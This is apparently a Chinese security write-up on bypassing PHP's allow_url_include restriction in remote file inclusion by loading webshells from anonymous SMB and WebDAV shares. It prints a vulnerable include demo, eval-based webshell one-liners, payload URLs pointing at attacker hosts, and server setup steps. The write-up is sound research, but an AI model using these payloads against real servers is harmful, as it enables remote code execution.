**作者：Qftm**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

# 前言

关于远程文件包含（Remote File Inclusion）漏洞，自从 `php version 5.2`
之后一直是一个比较鸡肋的问题！！！直到2019年5月份，国外的一篇文章（[RFI-SMB](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)）和推文（Twitter）吸引了大家的注意，其大概内容主要是通过PHP远程文件包含中
`allow_url_fopen`和`allow_url_include`
仅限制`http://`和`ftp://`的缺陷，利用SMB协议的文件共享进行绕过与包含。虽说，SMB如今在国内的局限性很大，但是在一定程度上，打破了RFI
URL包含限制的局面，同时，也启发了针对 `RFI`
的扩展利用和探索。正因如此，本文在其之前的基础上又进行了拓展利用与探索，通过巧用`WebDAV`来绕过URL包含限制Getshell，打破了如今`SMB`的局限性。

# RFI 基础

## 四个函数

PHP中引发文件包含漏洞的通常主要是以下四个函数：

include()

    
    
    http://www.php.net/manual/en/function.include.php

include_once()

    
    
    http://php.net/manual/en/function.include-once.php

require()

    
    
    http://php.net/manual/en/function.require.php

require_once()

    
    
    http://php.net/manual/en/function.require-once.php

## 函数功能

当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等），都会直接作为php文件进行解析。

![](https://images.seebug.org/content/images/2020/03/18/1584521089000-1uuuvv.png-w331s)

## 函数差异

**include()**

include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-2zvmin.png-w331s)

**require()**

require() 函数包含出错的话，则会直接退出，后续语句不在执行

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-3wszdo.png-w331s)

**include_once() 和 require_once()**

require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则
require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。

`二次包含`

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-4bctde.png-w331s)

`一次包含`

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-5ufxas.png-w331s)

# RFI 限制

用一个简单的例子构造一个含有文件包含漏洞的`Demo`，演示一下远程文件包含漏洞的利用，代码如下：

    
    
    <php
        $file = $_GET['file'];
        include $file;
    >

在上面的漏洞代码中，file参数从GET请求中取值，并且是用户可控的动态变量。当file接收到传入的参数值后，`include()`函数会直接进行内容包含。由于，文件包含函数加载的参数`file`没有经过任何的过滤或者严格的定义，可以由攻击者进行控制发起恶意的请求，包含其它恶意文件，从而让应用程序执行攻击者精心准备的恶意脚本，具体如下：

攻击者准备的恶意脚本：`shell.php`

    
    
    <php @eval($_POST['Qftm']);?>

攻击者发起的恶意请求：`payload`

    
    
    https://www.qftm.com/index.php?file=http://10.10.10.10/shell.php

通过上述请求，可以远程包含一个shell，一旦攻击者的恶意请求成功之后，可以达到任意代码执行漏洞也就是`RCE`。虽然用户没有对文件参数进行控制，但是想要得到一个真正的`RCE`还需要满足一个条件，如下`php.ini`配置：

    
    
    allow_url_fopen=On
    allow_url_include=On

只有当这两个配置设置成On时，最终的漏洞才能利用成功，遗憾的是PHP官方在 `php version 5.2`
之后默认的关闭了`allow_url_include`，是不是突然感觉没有了希望！！！不要放弃，下面利用我们强大的`Bypass`功能进行限制绕过。

# RFI 缺陷

对于RFI的缺陷，先来看一下PHP针对`allow_url_fopen`和`allow_url_include`的配置说明

`php7.x -> php.ini`

    
    
    Fopen wrappers 
    
    Whether to allow the treatment of URLs (like http:// or ftp://) as files.
     http://php.net/allow-url-fopen
    allow_url_fopen=On
    
    Whether to allow include/require to open URLs (like http:// or ftp://) as files.
    http://php.net/allow-url-include
    allow_url_include=Off

从配置中可以看到 `allow_url_fopen`和`allow_url_include`主要是针对两种协议起作用：`http://`、
`ftp://`。

PHP针对RFI URL包含限制主要是利用`allow_url_include=Off`来实现，将其设置为Off，可以让PHP不加载远程HTTP或FTP
URL，从而防止远程文件包含攻击。那么，我们是不是可以这样想，有没有什么其它协议可以让我们去包含远程服务器文件，答案是肯定的，例如`SMB`、`WebDAV`等协议。

既然这样，攻击者就可以利用这个缺陷，使用相应的协议进行Bypass。在这个过程中，即使`allow_url_fopen`和`allow_url_include`都设置为Off，PHP也不会阻止相应的远程文件加载。

# RFI 绕过

在介绍`WebDAV Bypass`的时候先来简单了解一下`SMB Bypass`，因为他们利用道理都差不多。

## SMB Bypass

SMB协议主要于网络文件的共享，SMB所在端口445。PHP在远程匿名加载smb所共享的文件时并不会对其进行拦截。

### 测试代码

    
    
    <php
        $file=$_GET['file'];
        include $file;
    >

### 攻击原理

    
    
    unc -> smb

### 攻击场景

当易受攻击的PHP应用程序代码尝试从攻击者控制的SMB服务器共享加载PHP Web
shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP
Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。

### 环境配置

首先，重新配置PHP环境，在php.ini文件中禁用`allow_url_fopen`以及`allow_url_include`。然后，配置SMB服务器具有匿名读访问权限。

  * **PHP环境设置**

首先，在受害者主机上配置php.ini，将`allow_url_fopen`和`allow_url_include`设置为Off

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-6tffms.png-w331s)

然后重启服务查看`phpinfo()`配置是否生效

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-7izhda.png-w331s)

  * **SAMBA服务器环境配置**

需要使用匿名读取访问权限配置SAMBA服务器（Ubuntu18.04）

    
    
    Samba是在Linux和UNIX系统上实现SMB协议的一个软件

（1）安装SAMBA服务器

    
    
    apt-get install samba

（2）创建SMB共享目录和 `php web shell`

    
    
    mkdir /var/www/html/pub/
    touch /var/www/html/pub/shell.php

![](https://images.seebug.org/content/images/2020/03/18/1584521092000-8nvtfq.png-w331s)

（3）配置新创建的SMB共享目录的权限

    
    
    chmod 0555 /var/www/html/pub/
    chown -R nobody:nogroup /var/www/html/pub/

![](https://images.seebug.org/content/images/2020/03/18/1584521092000-9nvufi.png-w331s)

（4）编辑samba配置文件 `/etc/samba/smb.conf`

    
    
    [global]
    workgroup = WORKGROUP
    server string = Samba Server %v
    netbios name = indishell-lab
    security = user
    map to guest = bad user
    name resolve order = bcast host
    dns proxy = no
    bind interfaces only = yes
    
    [Qftm]
    path = /var/www/html/pub
    writable = no
    guest ok = yes
    guest only = yes
    read only = yes
    directory mode = 0555
    force user = nobody

（5）重新启动SAMBA服务器以应用配置文件`/etc/samba/smb.conf`中的新配置

    
    
    service smbd restart 

成功重新启动SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求凭据。

![](https://images.seebug.org/content/images/2020/03/18/1584521092000-10gjxsa.png-w331s)

### Getshell

在环境都配置完且验证之后，利用`samba`目录`/var/www/html/pub`中共享的WebShell进行GetShell

  * `unc->payload`

    
    
    http://127.0.0.1/FI/index.php?file=\\192.33.6.145\qftm\shell.php

  * `shell.php`

    
    
    <php @eval($_POST['admin']);>

  * 蚁剑连接

![](https://images.seebug.org/content/images/2020/03/18/1584521092000-11nmwio.png-w331s)

![](https://images.seebug.org/content/images/2020/03/18/1584521093000-12jnzgd.png-w331s)

### SMB总结

针对smb利用的局限性，因为这种`unc`只能是在windows下使用，而且，`smb端口(445)`
在国内已经被封杀的差不多了（勒索病毒！！！），很难应用到实际中，但是其他的像`webdav`这种同理也是可以被包含的，且利用的价值更大。

## WebDAV Bypass

WebDAV（[Web 分布式创作和版本管理](http://webdav.org/)）是一项基于 HTTP/1.1
协议的通信协议。它扩展了HTTP/1.1 协议，在Get、Post、Put、Delete 等HTTP标准方法外添加了新方法，使应用程序可对Web
Server直接读写，并支持写文件锁定(Locking)和解锁(Unlock)，以及文件的版本控制。

PHP在远程匿名加载WebDAV所共享的文件时并不会对其进行拦截。

### 测试代码

    
    
    <php
        $file=$_GET['file'];
        include $file;
    >

### 攻击原理

    
    
    类unc -> WebDAV

### 攻击场景

当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web
shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP
Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。

### 环境配置

同SMB环境配置一样，首先，重新配置PHP环境，在php.ini文件中禁用`allow_url_fopen`以及`allow_url_include`。然后，配置WebDAV服务器。

  * **PHP环境设置**

首先，在受害者主机上配置php.ini，将`allow_url_fopen`和`allow_url_include`设置为Off

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-6tffms.png-w331s)

然后重启服务查看`phpinfo()`配置是否生效

![](https://images.seebug.org/content/images/2020/03/18/1584521091000-7izhda.png-w331s)

  * **WebDAV服务器环境配置**

需要使用匿名读取访问权限配置WebDAV服务器。

**1、Ubuntu18.04手动搭建WebDAV服务器**

（1）安装Apache Web服务器

    
    
    sudo apt-get install -y apache2

![](https://images.seebug.org/content/images/2020/03/18/1584521093000-15hjbbp.png-w331s)

（2）在Apache配置中启用WebDAV模块

    
    
    sudo a2enmod dav
    sudo a2enmod dav_fs

![](https://images.seebug.org/content/images/2020/03/18/1584521093000-16uyxvh.png-w331s)

（3）创建WebDAV共享目录`webdav`和 `php web shell`

    
    
    sudo mkdir -p /var/www/html/webdav
    sudo touch /var/www/html/webdav/shell.php

![](https://images.seebug.org/content/images/2020/03/18/1584521093000-17kdpnq.png-w331s)

（4）将文件夹所有者更改为您的Apache用户，`www-data`以便Apache具有对该文件夹的写访问权

    
    
    sudo chown -R www-data:www-data  /var/www/

![](https://images.seebug.org/content/images/2020/03/18/1584521095000-18zatcl.png-w331s)

（5）编辑WebDAV配置文件 `/etc/apache2/sites-available/000-default.conf`

不需要启用身份验证

    
    
    DavLockDB /var/www/html/DavLock
    <VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
    
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
    
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
    
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
        Alias /webdav /var/www/html/webdav 
        <Directory /var/www/html/webdav> 
            DAV On 
        </Directory>
    </VirtualHost>
    
    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet

（6）重新启动Apache服务器，以使更改生效

    
    
    sudo service apache2 restart

成功重新启动Apache服务器后，尝试访问WebDAV共享并确保WebDAV服务器不要求凭据。

![](https://images.seebug.org/content/images/2020/03/18/1584521095000-19fctrc.png-w331s)

除了上面在Ubuntu上一步步安装WebDAV服务器外，还可以利用做好的Docker镜像。

**2、WebDAV Docker镜像**

推荐使用Docker镜像方式去安装利用，免去一些因环境或配置不当而产生的问题

（1）拉取webdav镜像

镜像地址：`https://hub.docker.com/r/bytemark/webdav`

（2）用docker启动一个webdav服务器

    
    
    docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav

（3）在`~/webdav/data`目录里面共享自己php脚本

![](https://images.seebug.org/content/images/2020/03/18/1584521096000-20rspmi.png-w331s)

（5）验证Webdav服务器

浏览器验证

![](https://images.seebug.org/content/images/2020/03/18/1584521096000-21lngfe.png-w331s)

终端验证

![](https://images.seebug.org/content/images/2020/03/18/1584521096000-22fwiug.png-w331s)

### Getshell

在环境都配置完且验证之后，利用`webdav`目录`~/webdav/data`中共享的WebShell进行GetShell

  * `类unc->payload`

    
    
    http://127.0.0.1/FI/index.php?file=//172.17.0.2//webdav/shell.php

  * `shell.php`

    
    
    <?php echo eval(system("whoami"));phpinfo();?>
    <?PHP fputs(fopen('poc.php','w'),'<?php @eval($_POST[Qftm])?>');?>

为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义`shell.php`，通过服务器加载远程`shell.php`给我们自动生成一个`Webshell`。

请求构造的payload

![](https://images.seebug.org/content/images/2020/03/18/1584521096000-23wrlwm.png-w331s)

从图中可以看到远程加载`shell.php`利用成功，可以根据状态码分析其加载过程：

![](https://images.seebug.org/content/images/2020/03/18/1584521097000-24dqisd.png-w331s)

其中`code 207`是由WebDAV(RFC
2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。

  * 蚁剑连接

连接远程加载`shell.php`生成的`Webshell->poc.shell`

![](https://images.seebug.org/content/images/2020/03/18/1584521097000-25gahxh.png-w331s)

![](https://images.seebug.org/content/images/2020/03/18/1584521097000-26eawqy.png-w331s)

### WebDAV总结

`webdav`如今很多人都将其作为自己的个人数据共享存储服务器，其局限性远远小于`SMB`。

**Refference**

  1. <http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html>

  2. <https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1148/>

